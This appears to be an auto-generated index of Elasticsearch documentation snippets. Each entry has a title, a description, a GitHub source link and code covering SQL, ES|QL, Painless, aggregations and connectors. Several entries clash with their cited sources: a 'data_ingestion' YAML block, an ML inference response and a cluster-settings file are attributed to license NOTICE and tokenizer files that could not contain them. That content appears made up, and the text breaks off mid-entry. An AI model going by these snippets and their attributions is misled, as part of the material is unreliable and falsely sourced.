https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-analyzer.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ the, 2, quick, brown, foxes, jumped, over, the, lazy, dog, s, bone ]\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Data Ingestion Settings in YAML\nDESCRIPTION: This YAML configuration block defines various settings for Elasticsearch data ingestion. It includes options for field caps, composite aggregations, and runtime fields. These settings control the behavior and performance of data ingestion processes in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/guava-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ndata_ingestion:\n  field_caps:\n    # Control the number of results processed at once during shard level field caps execution.\n    # Default: 100\n    batch_size: 100\n  composite_agg:\n    # Control the number of results processed at once during shard level composite agg execution.\n    # Default: 100\n    batch_size: 100\n  runtime_fields:\n    # Control the number of results processed at once during shard level runtime fields resolution.\n    # Default: 100\n    batch_size: 100\n```\n\n----------------------------------------\n\nTITLE: Multiplication Operator in Elasticsearch SQL\nDESCRIPTION: Demonstrates multiplication (*) of two numeric values\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators-math.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT 2 * 3 AS x;\n```\n\n----------------------------------------\n\nTITLE: Defining GeoShapeScriptValues Inner Class in AbstractAtomicGeoShapeShapeFieldData\nDESCRIPTION: This class extends the AbstractAtomicGeoShapeShapeFieldData class and provides methods to retrieve GeoShapeValue objects by index or the current value. It's used for handling geospatial shape data in Elasticsearch scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/spatial/src/main/resources/org/elasticsearch/xpack/spatial/org.elasticsearch.xpack.spatial.index.fielddata.plain.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.xpack.spatial.index.fielddata.plain.AbstractAtomicGeoShapeShapeFieldData$GeoShapeScriptValues {\n  GeoShapeValues.GeoShapeValue get(int)\n  GeoShapeValues.GeoShapeValue getValue()\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Catalan Stop Words\nDESCRIPTION: Specifies the Catalan stop words for Elasticsearch text analysis, with a link to the relevant Lucene stop words.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_10\n\nLANGUAGE: markdown\nCODE:\n```\n`_catalan_`\n:   [Catalan stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/ca/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Demonstrating List Access with List Type in Painless\nDESCRIPTION: Shows how to use the list access operator with a List type in Painless, including adding elements, modifying elements, and accessing elements with both literal and variable indices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_9\n\nLANGUAGE: painless\nCODE:\n```\nList list = new ArrayList(); \nlist.add(1);                 \nlist.add(2);                 \nlist.add(3);                 \nlist[0] = 2;                 \nlist[1] = 5;                 \nint x = list[0] + list[1];   \nint y = 1;                   \nint z = list[y];             \n```\n\n----------------------------------------\n\nTITLE: Defining ESQL Date Rounding Function Test Case\nDESCRIPTION: This SQL code defines a test case for a date rounding function in Elasticsearch ESQL. It specifies the function name, its parameters, and expected results for various input scenarios.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/date_trunc.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Invalid Fixed Interval Configuration in Elasticsearch\nDESCRIPTION: This example demonstrates an invalid configuration of a date histogram aggregation using an unsupported calendar unit (weeks) for fixed intervals, resulting in an error.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"sales_over_time\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"fixed_interval\": \"2w\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining OffsetTime Class for SQL Scripting in Java\nDESCRIPTION: This snippet defines the OffsetTime class from the java.time package for use in SQL scripting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/main/resources/org/elasticsearch/xpack/sql/plugin/sql_whitelist.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.OffsetTime {\n}\n```\n\n----------------------------------------\n\nTITLE: Hash Function Description Comment\nDESCRIPTION: Generated comment block describing the hash computation functionality in ESQL, supporting multiple algorithms including MD5, SHA, SHA-224, SHA-256, SHA-384, and SHA-512.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/hash.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Creating a Zoom Connector Using the Elasticsearch API\nDESCRIPTION: API call to create a new self-managed Zoom connector by specifying the index name, connector name, and service type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-zoom.md#2025-04-22_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-zoom-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Zoom\",\n  \"service_type\": \"zoom\"\n}\n```\n\n----------------------------------------\n\nTITLE: Syntax for DROP Command in ESQL\nDESCRIPTION: Defines the syntax for the DROP command in ESQL, which is used to remove specified columns from the result set.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/drop.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nDROP columns\n```\n\n----------------------------------------\n\nTITLE: Uploading Extension File with HTTP PUT\nDESCRIPTION: Uploads the actual extension file using PUT request with the extension ID obtained from metadata creation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-custom-bundles.md#2025-04-21_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ncurl -XPUT \\\n-H \"Authorization: ApiKey $EC_API_KEY\" \\\n\"https://api.elastic-cloud.com/api/v1/deployments/extensions/$extension_id\" \\\n-T /tmp/synonyms.zip\n```\n\n----------------------------------------\n\nTITLE: Configuring ServiceNow Connector Configuration File\nDESCRIPTION: Yaml configuration file for connecting to Elasticsearch and configuring the ServiceNow connector with necessary authentication and service details\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-servicenow.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: servicenow\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types Table in Markdown\nDESCRIPTION: This markdown table defines the supported field types and their corresponding result types for ESQL functions. It covers a wide range of data types including primitives, geometric types, and specialized Elasticsearch types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/mv_dedupe.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | boolean |\n| cartesian_point | cartesian_point |\n| cartesian_shape | cartesian_shape |\n| date | date |\n| date_nanos | date_nanos |\n| double | double |\n| geo_point | geo_point |\n| geo_shape | geo_shape |\n| integer | integer |\n| ip | ip |\n| keyword | keyword |\n| long | long |\n| text | keyword |\n| unsigned_long | unsigned_long |\n| version | version |\n```\n\n----------------------------------------\n\nTITLE: Specifying Keyword and Date DocValues Fields for Elasticsearch in Java\nDESCRIPTION: These classes define keyword and date-specific DocValues fields for Elasticsearch scripting. They provide accessor methods for various data types including String and ZonedDateTime, supporting dynamic field data access in scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.fields.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.field.DateMillisDocValuesField @dynamic_type {\n  ZonedDateTime get(ZonedDateTime)\n  ZonedDateTime get(int, ZonedDateTime)\n}\n\nclass org.elasticsearch.script.field.BaseKeywordDocValuesField @dynamic_type {\n  String get(String)\n  String get(int, String)\n}\n\nclass org.elasticsearch.script.field.KeywordDocValuesField @dynamic_type {\n}\n```\n\n----------------------------------------\n\nTITLE: Index Of Function - Case-Sensitive Elasticsearch Query\nDESCRIPTION: This snippet checks if the character 'A' appears beyond index 2 in the `user_name` field. Uses a custom script to determine the index position and implement filtering logic.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_11\n\nLANGUAGE: Elasticsearch Painless\nCODE:\n```\n\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalEqlScriptUtils.indexOf(X0,params.v1,params.v2,params.v3),params.v4)))\",\"params\":{\"v0\":\"user_name\",\"v1\":\"A\",\"v2\":2,\"v3\":false,\"v4\":0}}\n```\n\n----------------------------------------\n\nTITLE: Defining Java String Class Methods\nDESCRIPTION: This snippet defines methods available from the java.lang.String class in Painless scripting. It includes methods for string manipulation like comparison, concatenation, containment checks, formatting, indexing, substring extraction, and case conversion.  The `org.elasticsearch.painless.api.Augmentation` indicates methods are extending functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_20\n\nLANGUAGE: java\nCODE:\n```\n\"class java.lang.String {\\n  ()\\n  int codePointAt(int)\\n  int codePointBefore(int)\\n  int codePointCount(int,int)\\n  int compareTo(String)\\n  int compareToIgnoreCase(String)\\n  String concat(String)\\n  boolean contains(CharSequence)\\n  boolean contentEquals(CharSequence)\\n  String copyValueOf(char[])\\n  String copyValueOf(char[],int,int)\\n  String org.elasticsearch.painless.api.Augmentation decodeBase64()\\n  String org.elasticsearch.painless.api.Augmentation encodeBase64()\\n  String[] org.elasticsearch.painless.api.Augmentation splitOnToken(String)\\n  String[] org.elasticsearch.painless.api.Augmentation splitOnToken(String, int)\\n  boolean endsWith(String)\\n  boolean equalsIgnoreCase(String)\\n  String format(Locale,String,def[])\\n  String format(String,def[])\\n  void getChars(int,int,char[],int)\\n  int indexOf(String)\\n  int indexOf(String,int)\\n  boolean isEmpty()\\n  String join(CharSequence,Iterable)\\n  int lastIndexOf(String)\\n  int lastIndexOf(String,int)\\n  int offsetByCodePoints(int,int)\\n  boolean regionMatches(boolean,int,String,int,int)\\n  boolean regionMatches(int,String,int,int)\\n  String replace(CharSequence,CharSequence)\\n  boolean startsWith(String)\\n  boolean startsWith(String,int)\\n  String substring(int)\\n  String substring(int,int)\\n  char[] toCharArray()\\n  String toLowerCase()\\n  String toLowerCase(Locale)\\n  String toUpperCase()\\n  String toUpperCase(Locale)\\n  String trim()\\n  String valueOf(def)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Launching Tableau with Custom Connector Path\nDESCRIPTION: PowerShell command to launch Tableau Desktop with parameters specifying the connector plugins path and disabling signature verification, necessary for testing custom connectors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/connectors/tableau/tdvt/README.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n.\\tableau.exe -DConnectPluginsPath=<path> -DDisableVerifyConnectorPluginSignature=true\n```\n\n----------------------------------------\n\nTITLE: Defining Collector.Characteristics Enum in Painless - Java\nDESCRIPTION: Defines the Collector.Characteristics enum, detailing the different characteristics applied to collectors, such as CONCURRENT or UNORDERED.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_11\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.Collector$Characteristics {\n  Collector.Characteristics CONCURRENT\n  Collector.Characteristics IDENTITY_FINISH\n  Collector.Characteristics UNORDERED\n  Collector.Characteristics valueOf(String)\n  Collector.Characteristics[] values()\n}\n```\n\n----------------------------------------\n\nTITLE: Unsupported TIME Data Type in GROUP BY\nDESCRIPTION: Example of an unsupported SQL query that uses the TIME data type directly in a GROUP BY clause without any transformation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_8\n\nLANGUAGE: sql\nCODE:\n```\nSELECT count(*) FROM test GROUP BY CAST(date_created AS TIME);\n```\n\n----------------------------------------\n\nTITLE: Apache License Notice Template\nDESCRIPTION: Boilerplate notice text for applying the Apache License 2.0 to a work, with placeholder fields for copyright year and owner information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-apple-module-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template (Text)\nDESCRIPTION: This is a sample copyright disclaimer template that an employer or school can sign to disclaim copyright interest in a program.  It includes the name of the organization, the program's name, and the author's name. This is a formal declaration relinquishing copyright claims.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xmp-commons-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: Text\nCODE:\n```\n \"   Yoyodyne, Inc., hereby disclaims all copyright interest in the\n    program `Gnomovision' (which makes passes at compilers) written by\n    James Hacker.\\n\\n    signature of Ty Coon, 1 April 1989\n    Ty Coon, President of Vice\"\n```\n\n----------------------------------------\n\nTITLE: Viewing ML Inference Response in Elasticsearch\nDESCRIPTION: Example response from a direct inference API call using a sentiment analysis model. The response includes the predicted sentiment label, prediction probability, and detailed scores for each possible sentiment.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-api-services-storage-NOTICE.txt#2025-04-21_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"inference_results\": [\n    {\n      \"predicted_value\": \"positive\",\n      \"prediction_probability\": 0.999626,\n      \"prediction_score\": 0.999626,\n      \"sentiment_score\": {\n        \"negative\": 0.000374,\n        \"positive\": 0.999626\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Query Without Sampler Aggregation\nDESCRIPTION: Shows how querying without sampler aggregation considers all matches, including low-quality ones, resulting in less focused significant terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-sampler-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /stackoverflow/_search?size=0\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"tags:kibana OR tags:javascript\"\n    }\n  },\n  \"aggs\": {\n    \"low_quality_keywords\": {\n      \"significant_terms\": {\n        \"field\": \"tags\",\n        \"size\": 3,\n        \"exclude\": [ \"kibana\", \"javascript\" ]\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"low_quality_keywords\": {\n      \"doc_count\": 600,\n      \"bg_count\": 650,\n      \"buckets\": [\n        {\n          \"key\": \"angular\",\n          \"doc_count\": 200,\n          \"score\": 0.02777,\n          \"bg_count\": 200\n        },\n        {\n          \"key\": \"jquery\",\n          \"doc_count\": 200,\n          \"score\": 0.02777,\n          \"bg_count\": 200\n        },\n        {\n          \"key\": \"logstash\",\n          \"doc_count\": 50,\n          \"score\": 0.0069,\n          \"bg_count\": 50\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting SMTP Connection Timeout in Elasticsearch YAML\nDESCRIPTION: Configures the socket connection timeout for SMTP. Defaults to two minutes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.connection_timeout\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Sanitization Disallow List in Elasticsearch YAML\nDESCRIPTION: Specifies HTML elements that are NOT allowed in email notifications. Supports individual elements and HTML feature groups.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_32\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.notification.email.html.sanitization.disallow\n```\n\n----------------------------------------\n\nTITLE: Using POWER Function in Elasticsearch SQL\nDESCRIPTION: Returns the value of the first numeric expression raised to the power of the second integer expression. If either input is null, the function returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_20\n\nLANGUAGE: sql\nCODE:\n```\nPOWER(\n    numeric_exp, <1>\n    integer_exp) <2>\n```\n\n----------------------------------------\n\nTITLE: Synthetic Source Boolean Field Example in Elasticsearch\nDESCRIPTION: Shows how to configure and use synthetic _source with boolean fields, demonstrating how boolean arrays are automatically sorted in the output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/boolean.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"bool\": { \"type\": \"boolean\" }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"bool\": [true, false, true, false]\n}\n```\n\n----------------------------------------\n\nTITLE: Unsupported Date Difference Calculation (ES|QL)\nDESCRIPTION: This code snippet demonstrates that ES|QL does not support the subtraction of a specific date from the current datetime using `now()`. This functionality is currently restricted. An attempt to subtract two datetimes directly will lead to an error.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/limitations.md#2025-04-21_snippet_8\n\nLANGUAGE: txt\nCODE:\n```\n\"now() - 2023-10-26\"\n```\n\n----------------------------------------\n\nTITLE: Defining Irish Stop Words\nDESCRIPTION: Defines the Irish stop words for Elasticsearch usage, providing a link to the corresponding Lucene stop words file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_25\n\nLANGUAGE: markdown\nCODE:\n```\n`_irish_`\n:   [Irish stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/ga/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Cluster Settings in YAML\nDESCRIPTION: Defines cluster-wide settings for an Elasticsearch deployment.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ml/src/main/resources/org/elasticsearch/xpack/ml/inference.nlp.tokenizers/spm_precompiled_normalizer.txt#2025-04-21_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\ncluster:\n  name: my-application\n  routing:\n    allocation:\n      disk:\n        threshold_enabled: true\n        watermark:\n          low: 85%\n          high: 90%\n          flood_stage: 95%\n\nnode:\n  name: node-1\n  master: true\n  data: true\n  ingest: true\n\npath:\n  data: /var/lib/elasticsearch\n  logs: /var/log/elasticsearch\n```\n\n----------------------------------------\n\nTITLE: Removing HDFS Repository Plugin from Elasticsearch\nDESCRIPTION: Command to remove the repository-hdfs plugin from Elasticsearch. Requires sudo privileges and the node must be stopped before removal.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/repository-hdfs.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove repository-hdfs\n```\n\n----------------------------------------\n\nTITLE: Sample Response for T-Shirt Sales Percentage Calculation\nDESCRIPTION: Illustrates the response format for the t-shirt sales percentage calculation query. It shows how the results are structured, including the date, total sales, t-shirt sales, and calculated percentage for each month.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-bucket-script-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n{\n   \"took\": 11,\n   \"timed_out\": false,\n   \"_shards\": ...,\n   \"hits\": ...,\n   \"aggregations\": {\n      \"sales_per_month\": {\n         \"buckets\": [\n            {\n               \"key_as_string\": \"2015/01/01 00:00:00\",\n               \"key\": 1420070400000,\n               \"doc_count\": 3,\n               \"total_sales\": {\n                   \"value\": 550.0\n               },\n               \"t-shirts\": {\n                   \"doc_count\": 1,\n                   \"sales\": {\n                       \"value\": 200.0\n                   }\n               },\n               \"t-shirt-percentage\": {\n                   \"value\": 36.36363636363637\n               }\n            },\n            {\n               \"key_as_string\": \"2015/02/01 00:00:00\",\n               \"key\": 1422748800000,\n               \"doc_count\": 2,\n               \"total_sales\": {\n                   \"value\": 60.0\n               },\n               \"t-shirts\": {\n                   \"doc_count\": 1,\n                   \"sales\": {\n                       \"value\": 10.0\n                   }\n               },\n               \"t-shirt-percentage\": {\n                   \"value\": 16.666666666666664\n               }\n            },\n            {\n               \"key_as_string\": \"2015/03/01 00:00:00\",\n               \"key\": 1425168000000,\n               \"doc_count\": 2,\n               \"total_sales\": {\n                   \"value\": 375.0\n               },\n               \"t-shirts\": {\n                   \"doc_count\": 1,\n                   \"sales\": {\n                       \"value\": 175.0\n                   }\n               },\n               \"t-shirt-percentage\": {\n                   \"value\": 46.666666666666664\n               }\n            }\n         ]\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Extension details response with deployment information in Elasticsearch Service\nDESCRIPTION: Sample JSON response from getting an extension with the include_deployments parameter, showing the extension details and an array of deployment IDs using this extension.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"custom-plugin\",\n    \"url\": \"repo://2286113333\",\n    \"extension_type\": \"plugin\",\n    \"deployments\": [\n        \"f91f3a9360a74e9d8c068cd2698c92ea\"\n    ],\n    \"version\": \"8.4.3\",\n    \"id\": \"2286113333\"\n}\n```\n\n----------------------------------------\n\nTITLE: Inefficient Multiple Filter Aggregations in Elasticsearch\nDESCRIPTION: This snippet shows a less efficient way of using multiple filter aggregations, which should be avoided in favor of the filters aggregation approach shown in the previous example.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-filter-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0&filter_path=aggregations\n{\n  \"aggs\": {\n    \"hats\": {\n      \"filter\": { \"term\": { \"type\": \"hat\" } },\n      \"aggs\": {\n        \"avg_price\": { \"avg\": { \"field\": \"price\" } }\n      }\n    },\n    \"t_shirts\": {\n      \"filter\": { \"term\": { \"type\": \"t-shirt\" } },\n      \"aggs\": {\n        \"avg_price\": { \"avg\": { \"field\": \"price\" } }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Gradle Build for Elasticsearch Plugin\nDESCRIPTION: This Gradle build script sets up the project for developing an Elasticsearch plugin. It defines plugin metadata, dependencies, and test configurations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/example-text-analysis-plugin.md#2025-04-21_snippet_0\n\nLANGUAGE: gradle\nCODE:\n```\next.pluginApiVersion = '8.7.0'\next.luceneVersion = '9.5.0'\n\nbuildscript {\n  ext.pluginApiVersion = '8.7.0'\n  repositories {\n    mavenCentral()\n  }\n  dependencies {\n    classpath \"org.elasticsearch.gradle:build-tools:${pluginApiVersion}\"\n  }\n}\n\napply plugin: 'elasticsearch.stable-esplugin'\napply plugin: 'elasticsearch.yaml-rest-test'\n\nesplugin {\n  name 'my-plugin'\n  description 'My analysis plugin'\n}\n\ngroup 'org.example'\nversion '1.0-SNAPSHOT'\n\nrepositories {\n  mavenLocal()\n  mavenCentral()\n}\n\ndependencies {\n\n  //TODO transitive dependency off and plugin-api dependency?\n  compileOnly \"org.elasticsearch.plugin:elasticsearch-plugin-api:${pluginApiVersion}\"\n  compileOnly \"org.elasticsearch.plugin:elasticsearch-plugin-analysis-api:${pluginApiVersion}\"\n  compileOnly \"org.apache.lucene:lucene-analysis-common:${luceneVersion}\"\n\n  //TODO for testing this also have to be declared\n  testImplementation \"org.elasticsearch.plugin:elasticsearch-plugin-api:${pluginApiVersion}\"\n  testImplementation \"org.elasticsearch.plugin:elasticsearch-plugin-analysis-api:${pluginApiVersion}\"\n  testImplementation \"org.apache.lucene:lucene-analysis-common:${luceneVersion}\"\n\n  testImplementation ('junit:junit:4.13.2'){\n    exclude group: 'org.hamcrest'\n  }\n  testImplementation 'org.mockito:mockito-core:4.4.0'\n  testImplementation 'org.hamcrest:hamcrest:2.2'\n\n}\n```\n\n----------------------------------------\n\nTITLE: Mapping Character Filter in Elasticsearch\nDESCRIPTION: Replaces specified string occurrences with predefined replacements during text stream processing\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/character-filter-reference.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n`mapping` character filter replaces any occurrences of the specified strings with the specified replacements\n```\n\n----------------------------------------\n\nTITLE: Token Output from Common Grams Filter in Elasticsearch\nDESCRIPTION: This shows the output tokens produced by the common_grams filter when processing 'the quick fox is brown' with 'is' and 'the' as common words.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-common-grams-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ the, the_quick, quick, fox, fox_is, is, is_brown, brown ]\n```\n\n----------------------------------------\n\nTITLE: KURTOSIS Aggregation Function in SQL\nDESCRIPTION: Quantifies the shape of the distribution of input values in a numeric field. Must be used directly on a field and cannot be used with scalar functions or operators.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MIN(salary) AS min, MAX(salary) AS max, KURTOSIS(salary) AS k FROM emp;\n```\n\n----------------------------------------\n\nTITLE: Defining Java Void Class\nDESCRIPTION: This snippet defines the java.lang.Void class, indicating it's available for use within Painless scripting. The Void class is non-instantiable placeholder class to hold a reference to the Class object representing the Java keyword void.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_24\n\nLANGUAGE: java\nCODE:\n```\n\"class java.lang.Void {\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Defining Augmentation Methods in Elasticsearch\nDESCRIPTION: This snippet defines three augmentation methods for calculating SHA hash values (sha1, sha256, sha512) in the context of Elasticsearch scripting. These methods are accessible through the org.elasticsearch.painless.api.Augmentation class, enabling script writers to utilize secure hash algorithms in their scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.reindex.txt#2025-04-21_snippet_0\n\nLANGUAGE: groovy\nCODE:\n```\nclass java.lang.String {\n  String org.elasticsearch.painless.api.Augmentation sha1()\n  String org.elasticsearch.painless.api.Augmentation sha256()\n  String org.elasticsearch.painless.api.Augmentation sha512()\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Top Hits Aggregation for LAST with Two Fields\nDESCRIPTION: This JSON snippet shows the Elasticsearch aggregation equivalent to the SQL LAST function with two fields for sorting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_31\n\nLANGUAGE: JSON\nCODE:\n```\n\"top_hits\":{\"from\":0,\"size\":1,\"version\":false,\"seq_no_primary_term\":false,\"explain\":false,\"docvalue_fields\":[{\"field\":\"date\",\"format\":\"strict_date_optional_time_nanos\"}],\"sort\":[{\"int\":{\"order\":\"desc\",\"missing\":\"_last\",\"unmapped_type\":\"integer\"}},{\"date\":{\"order\":\"desc\",\"missing\":\"_last\",\"unmapped_type\":\"date\"}}]}}}}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Top Hits Aggregation for FIRST with Two Fields\nDESCRIPTION: This JSON snippet shows the Elasticsearch aggregation equivalent to the SQL FIRST function with two fields for sorting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_29\n\nLANGUAGE: 